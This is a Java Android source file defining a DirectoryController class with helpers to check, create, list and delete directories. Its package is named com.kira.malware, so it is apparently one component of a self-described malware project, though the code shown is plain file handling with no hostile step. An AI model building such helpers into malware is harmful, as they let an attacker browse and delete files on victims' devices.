package com.kira.malware.controllers;

import androidx.annotation.NonNull;

import com.kira.malware.models.LogModel;

import java.io.File;
import java.util.Arrays;

public class DirectoryController {

    public static boolean exists(@NonNull String path) {
        return (new File(path)).exists();
    }

    public static LogModel create(@NonNull String path) {
        LogModel status = new LogModel();
        File directory = new File(path);
        String abs = directory.getAbsolutePath();
        if (directory.isFile()) {
            status.setErrorMessage(String.format("\"%s\" is file", abs));
        } else if (directory.exists()) {
            status.setErrorMessage(String.format("\"%s\" already exists", abs));
        } else {
            if (!directory.mkdirs()) {
                status.setErrorMessage(String.format("Cannot create \"%s\"", abs));
            } else {
                status.setSuccess(true);
                status.setSuccessMessage(String.format("\"%s\" was created successfully", abs));
            }
        }
        return status;
    }

    /**
     * Call LogModel.getFiles() to return "List&lt;File&gt;".
     */
    public static LogModel list(@NonNull String path) {
        LogModel status = new LogModel();
        File directory = new File(path);
        String abs = directory.getAbsolutePath();
        if (directory.isFile()) {
            status.setErrorMessage(String.format("\"%s\" is file", abs));
        } else if (!directory.exists()) {
            status.setErrorMessage(String.format("\"%s\" does not exist", abs));
        } else {
            File[] files = directory.listFiles();
            if (files == null) {
                status.setErrorMessage(String.format("Cannot list \"%s\"", abs));
            } else if (files.length < 1) {
                status.setErrorMessage(String.format("\"%s\" is empty", abs));
            } else {
                for (File file : files) {
                    status.appendMessage(file.getName());
                }
                status.setSuccess(true);
                status.setObject(Arrays.asList(files));
            }
        }
        return status;
    }

    public static LogModel delete(@NonNull String path) {
        LogModel status = new LogModel();
        File directory = new File(path);
        String abs = directory.getAbsolutePath();
        if (directory.isFile()) {
            status.setErrorMessage(String.format("\"%s\" is file", abs));
        } else if (!directory.exists()) {
            status.setErrorMessage(String.format("\"%s\" does not exist", abs));
        } else if (!directory.delete()) {
            status.setErrorMessage(String.format("Cannot delete \"%s\"", abs));
        } else {
            status.setSuccess(true);
            status.setSuccessMessage(String.format("\"%s\" was deleted successfully", abs));
        }
        return status;
    }

}